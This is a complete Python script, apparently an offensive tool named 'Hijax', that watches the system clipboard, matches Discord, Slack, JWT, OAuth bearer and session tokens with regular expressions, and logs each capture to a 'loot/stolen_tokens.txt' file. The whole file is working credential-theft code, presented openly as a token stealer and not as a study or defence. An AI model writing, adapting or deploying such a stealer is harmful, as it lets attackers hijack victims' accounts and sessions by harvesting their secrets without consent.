#!/usr/bin/env python3

import time
import re
import os
from datetime import datetime
import pyperclip

# === Setup loot directory and file ===
LOOT_DIR = "loot"
os.makedirs(LOOT_DIR, exist_ok=True)
LOOT_FILE = os.path.join(LOOT_DIR, "stolen_tokens.txt")

# === Define token regex patterns ===
patterns = {
    "Discord Token": r"[MN][A-Za-z\d]{23,28}\.[\w-]{6}\.[\w-]{27}",
    "JWT / Bearer Token": r"eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+",
    "Session ID": r"(sessionid|sid|token|auth)=\w{16,128}",
    "OAuth Bearer": r"Bearer\s+[A-Za-z0-9\-_\.=]+",
    "Slack Token": r"xox[baprs]-([0-9a-zA-Z-]+)",
}

print("📋 [Hijax] Clipboard Token Monitor started. Watching clipboard...")

def log_token(kind, token):
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    with open(LOOT_FILE, "a") as f:
        f.write(f"\n[{timestamp}] [{kind}]\n{token}\n{'-'*40}\n")
    print(f"[+] Captured {kind} token at {timestamp}")

# === Watcher loop ===
last_clipboard = ""

try:
    while True:
        try:
            clipboard = pyperclip.paste()
            if clipboard != last_clipboard:
                last_clipboard = clipboard
                for kind, pattern in patterns.items():
                    match = re.search(pattern, clipboard)
                    if match:
                        log_token(kind, match.group())
                        break
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(1.5)

except KeyboardInterrupt:
    print("\n[!] Stopping clipboard monitor.")
